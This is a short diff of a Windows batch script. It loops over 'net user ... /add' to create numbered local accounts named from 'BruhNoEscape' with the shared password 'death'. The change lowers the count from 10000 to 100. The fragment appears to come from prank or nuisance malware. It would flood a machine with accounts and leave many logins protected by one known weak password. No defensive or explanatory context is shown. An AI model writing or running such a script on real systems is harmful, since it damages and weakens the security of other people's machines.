@@ -22,7 +22,7 @@ setlocal enabledelayedexpansion
 set "base_username=BruhNoEscape"
 set "password=death"
 
-for /l %%i in (1,1,10000) do (
+for /l %%i in (1,1,100) do (
     set "username=%base_username%%%i"
     net user !username! %password% /add
 )
